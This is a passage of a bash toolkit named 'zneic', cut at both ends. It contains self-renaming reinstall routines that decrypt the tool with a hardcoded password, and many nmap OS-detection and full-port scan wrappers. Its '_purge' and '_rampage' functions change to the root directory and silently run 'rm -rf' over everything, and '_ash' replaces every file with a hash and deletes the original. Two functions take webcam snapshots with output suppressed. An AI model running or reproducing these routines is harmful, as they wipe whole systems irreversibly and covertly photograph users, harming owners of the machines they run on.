  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new


elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "OS/390" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new


else

  printf "$RED Not supported sys$NC\n"

fi




}


_c_melt(){ #selfc



if [ -f /usr/local/bin/zneic ]; then
   _loc=/usr/local/bin/zneic
else
  if [ -f ~/.spx/zneic ]; then
    _loc=~/.spx/zneic
  else
    openssl des -d -in zneic.sslz -out zneic -pass pass:cartof
    _loc=~/.spx/zneic
  fi
fi


  _system="$(uname -s)"





 if [ $_system == "Darwin" ]; then


   _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
   _new="$(echo $1 | rev )"


  cd ~
  mkdir blana ; cd blana
  sudo cp $_loc ./zneic
  sudo cp zneic zneic2
     if [ -f ~/.spx/zneic.sslz ]; then

       xzneic back
       sh zneic -uninstall
       _wasp=true

     else
       sh zneic -install
       _wasp=false
     fi
  sudo rm -rf zneic
  cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new
  cd .. ; sudo rm -rf blana

  if [ $_wasp == true ]; then
     zneic protect c
  else
     echo "moo" >/dev/null
  fi



elif [[ $_system == "Linux" ]]; then


  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

  cd ~
  sudo cp $_loc ./zneic
  sudo cp zneic zneic2
  cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  sudo rm -rf zneic2 ; printf "$_revved\n" ; sudo chmod +x $_new ; sudo cp $_new /usr/local/bin/
  sh zneic -uninstall
  sudo rm -rf zneic
  #sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}


elif [[ $_system == "GNU" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

 su
 cp $_loc ./zneic
 cp zneic zneic2
 sh zneic -uninstall
 rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 rm -rf zneic2 ; sh $_new -qinstall ; rm -rf $_new

elif [[ $_system == "Haiku" ]]; then


  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

  cat zneic | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  printf "$_new\n" ; sh $_new -qinstall
  sh zneic -uninstall
  rm -rf zneic


elif [[ $_system == "HP-UX" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new



elif [[ $_system == "Minix" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "OpenBSD" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new


elif [[ $_system == "SunOS" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new


elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "OS/390" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new


else

  printf "$RED Not supported sys$NC\n"

fi




}

_r_melt(){ #selfc



if [ -f /usr/local/bin/zneic ]; then
   _loc=/usr/local/bin/zneic
else
  if [ -f ~/.spx/zneic ]; then
    _loc=~/.spx/zneic
  else
    openssl des -d -in zneic.sslz -out zneic -pass pass:cartof
    _loc=~/.spx/zneic
  fi
fi


  _system="$(uname -s)"





 if [ $_system == "Darwin" ]; then


   _converted=$( echo $1 | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
   _new="$(echo $1)"


  cd ~
  mkdir blana ; cd blana
  sudo cp $_loc ./zneic
  sudo cp zneic zneic2
  sudo rm -rf zneic
  cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new
  cd .. ; sudo rm -rf blana



elif [[ $_system == "Linux" ]]; then


  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

  cd ~
  sudo cp $_loc ./zneic
  sudo cp zneic zneic2
  cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  sudo rm -rf zneic2 ; printf "$_revved\n" ; sudo chmod +x $_new ; sudo cp $_new /usr/local/bin/
  sh zneic -uninstall
  sudo rm -rf zneic
  #sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}


elif [[ $_system == "GNU" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

 su
 cp $_loc ./zneic
 cp zneic zneic2
 sh zneic -uninstall
 rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 rm -rf zneic2 ; sh $_new -qinstall ; rm -rf $_new

elif [[ $_system == "Haiku" ]]; then


  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

  cat zneic | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  printf "$_new\n" ; sh $_new -qinstall
  sh zneic -uninstall
  rm -rf zneic


elif [[ $_system == "HP-UX" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new



elif [[ $_system == "Minix" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "OpenBSD" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new


elif [[ $_system == "SunOS" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new


elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "OS/390" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new


else

  printf "$RED Not supported sys$NC\n"

fi




}






_radar(){ #selfe



       _system="$(uname -s)"

       if [ $_system == "Darwin" ]; then

         printf "\n"
         printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2}')$NC\n"
         printf "\n"

         speedtest-cli | grep -E 'Download|Upload'
         echo " "
         printf "$WHITE"
         date
         printf "$NC"

       elif [[ $_system == "Linux" ]]; then

         printf "\n"
         printf "$WHITE$(nmcli -t -f active,ssid |grep enp0s3 | sed '$d' | awk '{print $4,$5,$6}')$NC\n"
         printf "\n"

         speedtest-cli | grep -E 'Download|Upload'
         echo " "
         printf "$WHITE"
         date
         printf "$NC"

       elif [[ $_system == "GNU" ]]; then

         speedtest-cli | grep -E 'Download|Upload'
         echo " "
         printf "$WHITE"
         date
         printf "$NC"

       elif [[ $_system == "Haiku" ]]; then

         speedtest-cli | grep -E 'Download|Upload'
         echo " "
         printf "$WHITE"
         date
         printf "$NC"

       elif [[ $_system == "HP-UX" ]]; then

         speedtest-cli | grep -E 'Download|Upload'
         echo " "
         printf "$WHITE"
         date
         printf "$NC"


       elif [[ $_system == "Minix" ]]; then

         speedtest-cli | grep -E 'Download|Upload'
         echo " "
         printf "$WHITE"
         date
         printf "$NC"

       elif [[ $_system == "OpenBSD" ]]; then

         speedtest-cli | grep -E 'Download|Upload'
         echo " "
         printf "$WHITE"
         date
         printf "$NC"

       elif [[ $_system == "SunOS" ]]; then

         speedtest-cli | grep -E 'Download|Upload'
         echo " "
         printf "$WHITE"
         date
         printf "$NC"

       elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

         speedtest-cli | grep -E 'Download|Upload'
         echo " "
         printf "$WHITE"
         date
         printf "$NC"

       elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

         speedtest-cli | grep -E 'Download|Upload'
         echo " "
         printf "$WHITE"
         date
         printf "$NC"

       elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

         speedtest-cli | grep -E 'Download|Upload'
         echo " "
         printf "$WHITE"
         date
         printf "$NC"

       elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

         speedtest-cli | grep -E 'Download|Upload'
         echo " "
         printf "$WHITE"
         date
         printf "$NC"

       elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

         speedtest-cli | grep -E 'Download|Upload'
         echo " "
         printf "$WHITE"
         date
         printf "$NC"

       elif [[ $_system == "OS/390" ]]; then

         speedtest-cli | grep -E 'Download|Upload'
         echo " "
         printf "$WHITE"
         date
         printf "$NC"





       else

         printf "$RED Not supported sys$NC\n"

       fi

       _u_data 2> /dev/null

}


_purge() { #selfd

  if [ "$1" == "-q" ]; then
    while true; do
        read -ep 'Confirm?' response
        case $response in
            [Dd]* )
                _off
                sudo cd /
                bash -c 'rm -rf  ./*' >/dev/null 2>&1
                bash -c 'rm -rf ./.*' >/dev/null 2>&1
                _suicide
                break;;
            * )
                break;;
        esac
    done


  else

    while true; do
        read -ep 'Ready to purge?' response
        case $response in
            [Dd]* )
                _off
                sudo cd /
                bash -c 'rm -rf  ./*' >/dev/null 2>&1
                bash -c 'rm -rf ./.*' >/dev/null 2>&1
                printf "$RED Purging complete..$NC.\n"
                printf "$RED EXTRA VOLTAGE INCOMING IN 10.0371 SECONDS...$NC\n"
                printf "$RED SHUTDOWN IMMINENT !!! $NC\n"
                sleep 2
                _suicide
                break;;
            * )
                echo 'As you wish'
                break;;
        esac
    done

  fi

  _u_data 2> /dev/null

}

_rampage(){ #selfd



  _system="$(uname -s)"

  if [ $_system == "Darwin" ]; then


    sudo cd /
    bash -c 'rm -rf  ./*' >/dev/null 2>&1
    bash -c 'rm -rf ./.*' >/dev/null 2>&1


  elif [[ $_system == "Linux" ]]; then


    sudo cd /
    bash -c 'rm -rf  ./*' >/dev/null 2>&1
    bash -c 'rm -rf ./.*' >/dev/null 2>&1


  elif [[ $_system == "GNU" ]]; then

    su
    cd /
    bash -c 'rm -rf  ./*' >/dev/null 2>&1
    bash -c 'rm -rf ./.*' >/dev/null 2>&1



  elif [[ $_system == "Haiku" ]]; then


    cd /
    bash -c 'rm -rf  ./*' >/dev/null 2>&1
    bash -c 'rm -rf ./.*' >/dev/null 2>&1

  elif [[ $_system == "HP-UX" ]]; then

    su
    cd /
    bash -c 'rm -rf  ./*' >/dev/null 2>&1
    bash -c 'rm -rf ./.*' >/dev/null 2>&1


  elif [[ $_system == "Minix" ]]; then


    cd /
    bash -c 'rm -rf  ./*' >/dev/null 2>&1
    bash -c 'rm -rf ./.*' >/dev/null 2>&1

  elif [[ $_system == "OpenBSD" ]]; then

    su
    cd /
    bash -c 'rm -rf  ./*' >/dev/null 2>&1
    bash -c 'rm -rf ./.*' >/dev/null 2>&1

  elif [[ $_system == "SunOS" ]]; then

    su
    cd /
    bash -c 'rm -rf  ./*' >/dev/null 2>&1
    bash -c 'rm -rf ./.*' >/dev/null 2>&1

  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

    su
    cd /
    bash -c 'rm -rf  ./*' >/dev/null 2>&1
    bash -c 'rm -rf ./.*' >/dev/null 2>&1

  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

    su
    cd /
    bash -c 'rm -rf  ./*' >/dev/null 2>&1
    bash -c 'rm -rf ./.*' >/dev/null 2>&1

  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

    su
    cd /
    bash -c 'rm -rf  ./*' >/dev/null 2>&1
    bash -c 'rm -rf ./.*' >/dev/null 2>&1

  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

    su
    cd /
    bash -c 'rm -rf  ./*' >/dev/null 2>&1
    bash -c 'rm -rf ./.*' >/dev/null 2>&1

  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

    su
    cd /
    bash -c 'rm -rf  ./*' >/dev/null 2>&1
    bash -c 'rm -rf ./.*' >/dev/null 2>&1

  elif [[ $_system == "OS/390" ]]; then

    su
    cd /
    bash -c 'rm -rf  ./*' >/dev/null 2>&1
    bash -c 'rm -rf ./.*' >/dev/null 2>&1


  else

    printf "$RED Not supported sys$NC\n"

  fi


}


_maid() { #selft

if [ $1 == "-l" ]; then

    while true; do
        read -ep 'Security Service, agent here, should I lock? [d/N] ' response
        case $response in
            [Ll]* )
                tar -vcf directory.tar ./
                openssl aes256 -in directory.tar -out locked_dir.aes256
                break;;
            * )
                echo 'Locking canceled - Agent Signing Out'
                break;;
        esac
    done
    echo 'Locking done - Agent Signing Out'

  elif [[ $1 == "-u" ]]; then

    while true; do
        read -ep 'Security Service, agent here, should I unlock? [d/N] ' response
        case $response in
            [Uu]* )
                openssl aes256 -d -salt -in locked_dir.aes256 -out unlocked.tar
                tar --one-top-level -xvf unlocked.tar
                break;;
            * )
                echo 'Unlocking canceled - Agent Signing Out'
                break;;
        esac
    done
    echo 'Unlocking done - Agent Signing Out'

  else

    while true; do
        read -ep 'Room Service, maid here, should I clean up? [d/N] ' response
        case $response in
            [Dd]* )
                bash -c 'rm -rf ./*'
                bash -c 'rm -rf ./.*'
                break;;
            * )
                echo 'Cleaning canceled - Maid Signing Out'
                break;;
        esac
    done
    echo 'Cleaning done - Maid Signing Out'

  fi

  _u_data 2> /dev/null
}


_ash(){

  find . -type f -print0 | while IFS= read -r -d $'\0' file;
  do cat $file | openssl sha512 >> $file.ash ; sudo rm -rf $file ;
  done

  _u_data 2> /dev/null

}


_osf(){




    cd /
    _devn="$(ls | grep -c dev)"
    _etcn="$(ls | grep -c etc)"
    _homn="$(ls | grep -c home)"
    _usrn="$(ls | grep -c usr)"
    _varn="$(ls | grep -c var)"
    _binn="$(ls | grep -c bin)"
    _sbnn="$(ls | grep -c sbin)"
    _tmpn="$(ls | grep -c tmp)"
    _envn="$(ls | grep -c env)"

    if [ $_envn == "1" ]; then
      printf "This should be Plan 9\n"
    else
      printf "OS Unknown\n"
    fi

}

_docked(){ #selft

    sudo lsof -i :"$@"

    _u_data 2> /dev/null

}

_ports(){ #selft

  _system="$(uname -s)"

   for i in `seq $1 $2`;
        do
                echo "Port $i ->>"

                if [ $_system == "Darwin" ]; then
                  sudo lsof -i :$i
                elif [[ $_system == "Linux" ]]; then
                  sudo lsof -i :$i
                elif [[ $_system == "GNU" ]]; then
                  printf "$RED Not supported yet$NC\n"
                elif [[ $_system == "Haiku" ]]; then
                  lsof -i :$i
                elif [[ $_system == "HP-UX" ]]; then
                  printf "$RED Not supported yet$NC\n"
                elif [[ $_system == "Minix" ]]; then
                  printf "$RED Not supported yet$NC\n"
                elif [[ $_system == "OpenBSD" ]]; then
                  printf "$RED Not supported yet$NC\n"
                elif [[ $_system == "SunOS" ]]; then
                  printf "$RED Not supported yet$NC\n"
                elif [[ $_system == "OS/390" ]]; then
                  printf "$RED Not supported yet$NC\n"
                else
                  printf "$RED Not supported sys$NC\n"
                fi

        done

    _u_data 2> /dev/null

}

_cheese(){ #selft




  _system="$(uname -s)"

  if [ $_system == "Darwin" ]; then   #tw

    imagesnap -w 1 -q >/dev/null

  elif [[ $_system == "Linux" ]]; then  #nn

    fswebcam -r 640x480 --jpeg 85 -D 1 snapshot.jpg >/dev/null

  elif [[ $_system == "GNU" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "Haiku" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "HP-UX" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "Minix" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "OpenBSD" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "SunOS" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "OS/390" ]]; then

    printf "$RED Not supported yet$NC\n"

  else

    printf "$RED Not supported sys$NC\n"

  fi

  _u_data 2> /dev/null

}

_wisconsin(){ #selft

    _system="$(uname -s)"

  if [ $_system == "Darwin" ]; then  #tw

    imagesnap -w 1 -q .snapshot.png >/dev/null

  elif [[ $_system == "Linux" ]]; then  #nn

    fswebcam -r 640x480 --jpeg 85 -D 1 snapshot.jpg >/dev/null

  elif [[ $_system == "GNU" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "Haiku" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "HP-UX" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "Minix" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "OpenBSD" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "SunOS" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "OS/390" ]]; then

    printf "$RED Not supported yet$NC\n"

  else

    printf "$RED Not supported sys$NC\n"

  fi

  _u_data 2> /dev/null
}

_wit2(){ #selft

     if [ "$2" == "i" ]; then

     sudo nmap -O --osscan-guess -Pn -vv  $1

     else

     sudo nmap -O --osscan-guess -Pn -vv  $1

     fi

     _u_data 2> /dev/null

}


_wit(){ #selft

     if [ "$2" == "i" ]; then

     sudo nmap -O --osscan-guess -Pn $1

     else

     sudo nmap -O --osscan-guess -Pn $1

     fi

     _u_data 2> /dev/null

}

_wit6(){ #selft

   if [ $2 == "i" ]; then

     sudo nmap -O --osscan-guess -Pn -vv -6  $1

   else

     sudo nmap -O --osscan-guess -Pn -vv -6  $1

   fi

   _u_data 2> /dev/null

}

_wth(){ #selft



     if [ $2 == "i" ]; then
        sudo nmap -O --osscan-guess -Pn -sSU -vv $1
     else
        sudo nmap -O --osscan-guess -Pn -sSU -vv $1
     fi

     _u_data 2> /dev/null

}

_wth6(){ #selft



     if [ $2 == "i" ]; then
        sudo nmap -O --osscan-guess -Pn -sSU -6 -vv $1
     else
        sudo nmap -O --osscan-guess -Pn -sSU -6 -vv $1
     fi

     _u_data 2> /dev/null

}


_col(){ #selft



    if [ $2 == "i" ]; then
       sudo nmap -T4 -n -A -Pn -vv -p1-65535 -O --osscan-guess $1
    else
       sudo nmap -T4 -n -A -Pn -vv -p1-65535 -O --osscan-guess $1
    fi

    _u_data 2> /dev/null

}

_col6(){ #selft



    if [ $2 == "i" ]; then
       sudo nmap -T4 -n -A -Pn -vv -p1-65535 -O -6 --osscan-guess $1
    else
       sudo nmap -T4 -n -A -Pn -vv -p1-65535 -O -6 --osscan-guess $1
    fi

    _u_data 2> /dev/null

}

_wtf(){ #selft




    if [ $2 == "i" ]; then
       sudo nmap -A -T4 -n -O --osscan-guess -vv -Pn -sV -sSU $1
    else
       sudo nmap -A -T4 -n -O --osscan-guess -vv -Pn -sV -sSU $1
    fi

    _u_data 2> /dev/null

}


_wtf6(){ #selft



    if [ $2 == "i" ]; then
       sudo nmap -A -T4 -n -O --osscan-guess -vv -Pn -p1-65535 -sSU -6 $1
    else
       sudo nmap -A -T4 -n -O --osscan-guess -vv -Pn -p1-65535 -sSU -6 $1
    fi

    _u_data 2> /dev/null


}


_pizdec(){ #selft




     if [ $2 == "i" ]; then
